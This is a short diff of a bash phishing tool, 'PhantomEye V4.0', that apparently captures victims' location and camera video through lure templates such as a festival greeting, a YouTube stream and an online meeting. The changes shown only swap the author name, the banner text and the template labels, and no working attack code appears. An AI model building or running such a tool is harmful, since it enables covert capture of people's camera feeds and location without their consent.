@@ -1,7 +1,7 @@
 #!/bin/bash
 # PhantomEye_V4.0 - Fixed and Enhanced
-# Author - Dr.Deathstalker (Enhanced)
-# Full data capture with location, images, and video chunks
+# Author - Dreamdrafted (Enhanced)
+# Full data capture with location and video chunks
 # Fully compatible with Termux (Android) and Kali Linux
 
 set -euo pipefail
@@ -30,8 +30,8 @@ banner() {
   printf "\e[1;92m(  _ \( )_( )  /__\  ( \( )(_  _)(  _  )(  \/  )( ___)( \/ )( ___)  \e[0m\n"
   printf "\e[1;92m )___/ ) _ (  /(__)\  )  (   )(   )(_)(  )    (  )__)  \  /  )__)   \e[0m\n"
   printf "\e[1;92m(__)  (_) (_)(__)(__)(_)\_) (__) (_____)(_/\/\_)(____) (__) (____)  \e[0m\n"
-  printf " \e[1;93m PhantomEye V4.0 - Fixed & Enhanced \e[0m \n"
-  printf " \e[1;77m Compatible with Termux, Kali, Windows, Linux, and macOS \e[0m \n"
+  printf " \e[1;93m PhantomEye V4.0 | Author: Dreamdrafted (dreamdrafted000@gmail.com) \e[0m \n"
+  printf " \e[1;77m     Compatible with Termux, Kali, Windows, Linux, and macOS \e[0m \n"
   printf "\n"
   
   if [[ "$termux_mode" == true ]]; then
@@ -295,8 +295,8 @@ EOF
 
 select_template() {
   printf "\n-----Choose a template----\n"    
-  printf "\n\e[1;92m[01]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-  printf "\e[1;92m[02]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
+  printf "\n\e[1;92m[01]\e[0m\e[1;93m Phantomgreet \e[0m\n"
+  printf "\e[1;92m[02]\e[0m\e[1;93m Live Youtube Streem\e[0m\n"
   printf "\e[1;92m[03]\e[0m\e[1;93m Online Meeting\e[0m\n"
   
   default_option_template="1"
